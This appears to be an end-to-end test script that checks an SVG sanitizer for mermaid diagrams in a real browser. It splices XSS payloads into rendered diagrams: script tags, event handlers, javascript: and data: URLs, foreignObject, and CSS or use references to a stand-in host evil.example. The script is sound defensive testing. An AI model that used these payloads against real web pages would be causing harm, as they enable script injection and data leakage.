/**
 * End-to-end verification for `sanitizeSvg` (src/components/markdown-cache.tsx),
 * the second control on the mermaid path in `renderMermaidBlocks`.
 *
 * WHY THIS EXISTS AND IS NOT A UNIT TEST
 * This package's runner (`bun test`) has no DOM, and the sanitizer's whole job is
 * DOM filtering. happy-dom cannot stand in: its HTML parser drops every child of
 * an `<svg>` (so everything "passes" because everything is gone), and its XML
 * parser makes DOMPurify a no-op that leaves `<script>` and `onload=` untouched
 * (so everything "passes" while nothing is filtered). A green test on happy-dom
 * would be evidence of nothing. Adding a browser-test dependency to this package
 * is a lockfile change, so the faithful check lives here instead: real Chromium,
 * real DOMPurify 3.3.1, real mermaid 11.4.1, and the actual bundled source of
 * `sanitizeSvg` — never a re-implementation of it.
 *
 * The decisive assertion is not string matching: every sanitized payload is
 * inserted into a live document and the run fails if any of it executes.
 *
 * Run:  bun run packages/session-ui/script/verify-mermaid-svg-sanitizer.mjs
 * Playwright's browsers and mermaid resolve out of packages/claxedo-app, which is
 * where this repo keeps both.
 */
import { createRequire } from "node:module"
import { tmpdir } from "node:os"
import { dirname, join, resolve } from "node:path"
import { fileURLToPath } from "node:url"

const HERE = dirname(fileURLToPath(import.meta.url))
const PACKAGE = resolve(HERE, "..")
const APP = resolve(PACKAGE, "../claxedo-app")
// Outside the repo by default: the screenshot is evidence for a run, not an asset.
const OUT = process.env.MERMAID_VERIFY_OUT ?? join(tmpdir(), "mermaid-sanitizer-verify.png")

const require_ = createRequire(join(APP, "package.json"))
const { chromium } = await import(require_.resolve("playwright-core"))
const mermaidBundle = join(dirname(require_.resolve("mermaid")), "mermaid.min.js")

// Bundle the REAL module under test. A copy of the policy would verify the copy.
const entry = join(HERE, ".verify-entry.ts")
await Bun.write(
  entry,
  `import { sanitizeSvg } from "../src/components/markdown-cache"\n` +
    `;(globalThis as any).sanitizeSvg = sanitizeSvg\n`,
)
const built = await Bun.build({ entrypoints: [entry], target: "browser", minify: false })
if (!built.success) {
  console.error(built.logs.join("\n"))
  throw new Error("failed to bundle sanitizeSvg")
}
const sanitizerBundle = await built.outputs[0].text()
await Bun.file(entry).delete()

const MERMAID_INIT = {
  startOnLoad: false,
  securityLevel: "strict",
  suppressErrorRendering: true,
  theme: "base",
  // Must mirror packages/claxedo-app/src/features/session/ui/mermaid-timeline.ts.
  htmlLabels: false,
  flowchart: { htmlLabels: false },
  class: { htmlLabels: false },
  themeVariables: {
    background: "#181818",
    primaryColor: "#181818",
    primaryTextColor: "#e6e6e6",
    primaryBorderColor: "#444",
    lineColor: "#888",
    textColor: "#e6e6e6",
    mainBkg: "#181818",
    nodeBorder: "#444",
  },
}

const FLOWCHART = `flowchart TD
  A[Start Node] -->|yes| B{Decision}
  B --> C[Do Thing]
  B --> D[Other Thing]`

const browser = await chromium.launch({ headless: true })
const page = await browser.newPage({ viewport: { width: 1100, height: 900 } })
const pageErrors = []
page.on("pageerror", (e) => pageErrors.push(e.message))

await page.setContent(
  `<!doctype html><html><body style="background:#181818;margin:0;font:13px ui-monospace,monospace;color:#ccc">
     <div id="report" style="padding:12px"></div><div id="stage" style="padding:12px"></div>
   </body></html>`,
)
await page.addScriptTag({ path: mermaidBundle })
await page.addScriptTag({ content: sanitizerBundle })

const results = await page.evaluate(
  async ({ MERMAID_INIT, FLOWCHART }) => {
    const { mermaid, sanitizeSvg } = globalThis
    mermaid.initialize(MERMAID_INIT)

    // Anything that executes lands here. Empty at the end === nothing ran.
    globalThis.__fired = []
    globalThis.__xss = (what) => globalThis.__fired.push(what)

    const cases = []
    const add = (name, raw, checks) => cases.push({ name, raw, checks })

    // --- Positive control: a real, unmodified mermaid diagram --------------
    const { svg: benign } = await mermaid.render("benign", FLOWCHART)
    add("positive-control/real-flowchart", benign, null)

    // --- Payloads spliced into a REAL mermaid SVG -------------------------
    // Mermaid's strict pass blocks these from its own label path today; the
    // point of this sanitizer is that it holds when that pass is bypassed,
    // which is exactly what the >=11.1.0 <11.10.0 advisories describe. So the
    // payloads are injected as if a bypass had already succeeded.
    const inject = (markup) => benign.replace("</svg>", `${markup}</svg>`)

    // NB: needles are matched as substrings, so a bare "script" would false-positive
    // on mermaid's own `aria-roledescription` attribute. Match the tag, not the word.
    add("script-tag", inject(`<script>__xss('script-tag')<\/script>`), ["<script", "__xss"])
    add("script-tag-nested-g", inject(`<g><script>__xss('nested')<\/script></g>`), ["<script", "__xss"])
    add("on-handler/onload", inject(`<rect width="5" height="5" onload="__xss('onload')"/>`), ["onload"])
    add("on-handler/onerror", inject(`<image href="x" onerror="__xss('onerror')"/>`), ["onerror"])
    add("on-handler/onclick", inject(`<rect width="99" height="99" onclick="__xss('onclick')"/>`), ["onclick"])
    add(
      "javascript-url/href",
      inject(`<a href="javascript:__xss('href')"><text x="5" y="5">go</text></a>`),
      ["javascript:"],
    )
    add(
      "javascript-url/xlink",
      inject(`<a xlink:href="javascript:__xss('xlink')"><text x="5" y="5">go</text></a>`),
      ["javascript:"],
    )
    add(
      "javascript-url/obfuscated",
      inject(`<a xlink:href="java&#9;script:__xss('obf')"><text x="5" y="5">go</text></a>`),
      ["script:"],
    )
    add(
      "foreignObject",
      inject(
        `<foreignObject width="200" height="50"><div xmlns="http://www.w3.org/1999/xhtml">` +
          `LEAKED<img src=x onerror="__xss('fo-img')"><\/div></foreignObject>`,
      ),
      ["foreignObject", "foreignobject", "LEAKED", "<img", "onerror"],
    )
    add("use/external", inject(`<use href="https://evil.example/x.svg#a"/>`), ["evil.example", "<use"])
    add("use/external-xlink", inject(`<use xlink:href="https://evil.example/x.svg#a"/>`), ["evil.example"])
    // `image` is in DOMPurify's DEFAULT_DATA_URI_TAGS, so a data: URI on it is
    // exempted from ALLOWED_URI_REGEXP. Only forbidding the tag closes this.
    add("data-uri/image", inject(`<image href="data:image/svg+xml,%3Csvg%20onload%3D__xss(1)%3E"/>`), [
      "data:",
      "<image",
    ])
    add("data-uri/anchor", inject(`<a href="data:text/html,%3Cscript%3E__xss(1)%3C/script%3E">x</a>`), ["data:"])
    add("css/@import", inject(`<style>@import url("https://evil.example/x.css");</style>`), ["@import", "evil.example"])
    add(
      "css/remote-url",
      inject(`<style>.n{background:url("https://evil.example/pixel?c=1")}</style>`),
      ["evil.example"],
    )
    add("animate/attribute-retarget", inject(`<animate attributeName="href" to="javascript:__xss('anim')"/>`), [
      "<animate",
      "javascript:",
    ])

    const stage = document.getElementById("stage")
    const out = []
    for (const { name, raw, checks } of cases) {
      const safe = sanitizeSvg(raw)
      // The decisive step: put it in a live document and see if anything runs.
      const host = document.createElement("div")
      host.innerHTML = safe
      stage.appendChild(host)
      const leaked = (checks ?? []).filter((needle) => safe.toLowerCase().includes(needle.toLowerCase()))
      out.push({ name, empty: safe.length === 0, length: safe.length, leaked })
    }

    // Give anything asynchronous (onload/onerror/animate) a chance to fire.
    await new Promise((r) => setTimeout(r, 300))

    // Positive control, measured on the sanitized output of the real diagram.
    const safeBenign = sanitizeSvg(benign)
    const probe = document.createElement("div")
    probe.innerHTML = safeBenign
    const svgEl = probe.querySelector("svg")
    const labels = [...probe.querySelectorAll("text")].map((t) => t.textContent.trim()).filter(Boolean)
    const control = {
      hasSvg: !!svgEl,
      shapes: probe.querySelectorAll("rect, polygon, circle, ellipse").length,
      edges: probe.querySelectorAll("path").length,
      markers: probe.querySelectorAll("marker").length,
      labels,
      styleChars: (probe.querySelector("style")?.textContent ?? "").length,
      markerRefs: [...probe.querySelectorAll("[marker-end]")].map((e) => e.getAttribute("marker-end")),
      inlineStyled: [...probe.querySelectorAll("[style]")].length,
      idsPreserved: !!svgEl && !svgEl.id.startsWith("user-content-"),
      shrinkPct: Math.round((1 - safeBenign.length / benign.length) * 100),
    }

    // Every diagram type the app can render must survive, not just flowcharts:
    // a policy tuned to one shape can quietly gut the others.
    const types = {
      flowchart: FLOWCHART,
      sequence: `sequenceDiagram\n  Alice->>John: Hello John\n  John-->>Alice: Great!`,
      class: `classDiagram\n  Animal <|-- Duck\n  Animal : +int age\n  Duck : +swim()`,
      state: `stateDiagram-v2\n  [*] --> Still\n  Still --> Moving\n  Moving --> [*]`,
      er: `erDiagram\n  CUSTOMER ||--o{ ORDER : places`,
      gantt: `gantt\n  title A Gantt\n  section S\n  Task1 :a1, 2024-01-01, 30d`,
      pie: `pie title Pets\n  "Dogs" : 386\n  "Cats" : 85`,
      gitgraph: `gitGraph\n  commit\n  branch dev\n  commit`,
      mindmap: `mindmap\n  root((mind))\n    a\n    b`,
    }
    const perType = []
    let t = 0
    for (const [name, source] of Object.entries(types)) {
      const { svg } = await mermaid.render(`type-${t++}`, source)
      const safe = sanitizeSvg(svg)
      const box = document.createElement("div")
      box.innerHTML = safe
      perType.push({
        name,
        kept: Math.round((safe.length / svg.length) * 100),
        elements: box.querySelectorAll("*").length,
        texts: [...box.querySelectorAll("text")].filter((n) => n.textContent.trim()).length,
        styleChars: (box.querySelector("style")?.textContent ?? "").length,
      })
    }

    return { cases: out, control, perType, fired: globalThis.__fired }
  },
  { MERMAID_INIT, FLOWCHART },
)

// Render the sanitized real diagram for the visual check.
await page.evaluate(
  async ({ FLOWCHART }) => {
    const { mermaid, sanitizeSvg } = globalThis
    document.getElementById("stage").innerHTML = ""
    const report = document.getElementById("report")
    const { svg } = await mermaid.render("visual", FLOWCHART)
    for (const [label, markup] of [
      ["RAW mermaid output", svg],
      ["AFTER sanitizeSvg", sanitizeSvg(svg)],
    ]) {
      const h = document.createElement("div")
      h.textContent = label
      h.style.cssText = "color:#7f7;padding:6px 0"
      report.appendChild(h)
      const box = document.createElement("div")
      box.style.cssText = "border:1px solid #333;padding:8px;width:480px;margin-bottom:8px"
      box.innerHTML = markup
      report.appendChild(box)
    }
  },
  { FLOWCHART },
)
await page.screenshot({ path: OUT, fullPage: true })
await browser.close()

// ---- report -----------------------------------------------------------------
let failed = 0
const fail = (msg) => {
  failed++
  console.log("  FAIL " + msg)
}

console.log("\nPAYLOADS (leaked = dangerous substring survived sanitization)")
for (const c of results.cases) {
  if (c.name.startsWith("positive-control")) continue
  if (c.leaked.length) fail(`${c.name}: leaked ${JSON.stringify(c.leaked)}`)
  else console.log(`  ok   ${c.name} (${c.length} chars out)`)
}

console.log("\nEXECUTION (the decisive check: sanitized output inserted into a live document)")
if (results.fired.length) fail(`payload executed: ${JSON.stringify(results.fired)}`)
else console.log("  ok   nothing executed")
if (pageErrors.length) console.log("  note page errors:", pageErrors)

console.log("\nPOSITIVE CONTROL (real flowchart must survive intact)")
const c = results.control
console.log(`  svg=${c.hasSvg} shapes=${c.shapes} edges=${c.edges} markers=${c.markers}`)
console.log(`  labels=${JSON.stringify(c.labels)}`)
console.log(`  styleChars=${c.styleChars} inlineStyled=${c.inlineStyled} markerRefs=${c.markerRefs.length}`)
console.log(`  idsPreserved=${c.idsPreserved} sizeShrink=${c.shrinkPct}%`)
if (!c.hasSvg) fail("positive control: no <svg> survived")
if (c.shapes < 4) fail(`positive control: expected >=4 node shapes, got ${c.shapes}`)
if (c.edges < 3) fail(`positive control: expected >=3 edge paths, got ${c.edges}`)
if (c.styleChars < 500) fail(`positive control: theme stylesheet gone (${c.styleChars} chars)`)
if (!c.idsPreserved) fail("positive control: ids were rewritten, id-scoped CSS is broken")
if (c.markerRefs.length === 0) fail("positive control: arrowhead marker references gone")
for (const label of ["Start Node", "Decision", "Do Thing", "Other Thing", "yes"]) {
  if (!c.labels.includes(label)) fail(`positive control: label "${label}" missing`)
}

console.log("\nPOSITIVE CONTROL BY DIAGRAM TYPE (kept% of raw bytes; must not be gutted)")
for (const t of results.perType) {
  console.log(
    `  ${t.name.padEnd(10)} kept=${String(t.kept).padStart(3)}% elements=${t.elements} texts=${t.texts} styleChars=${t.styleChars}`,
  )
  if (t.kept < 90) fail(`${t.name}: sanitizer removed ${100 - t.kept}% of the diagram`)
  if (t.elements < 10) fail(`${t.name}: only ${t.elements} elements survived`)
  if (t.texts === 0) fail(`${t.name}: every label was stripped`)
}

console.log(`\nscreenshot: ${OUT}`)
console.log(failed === 0 ? "\nRESULT: PASS" : `\nRESULT: FAIL (${failed})`)
process.exit(failed === 0 ? 0 : 1)
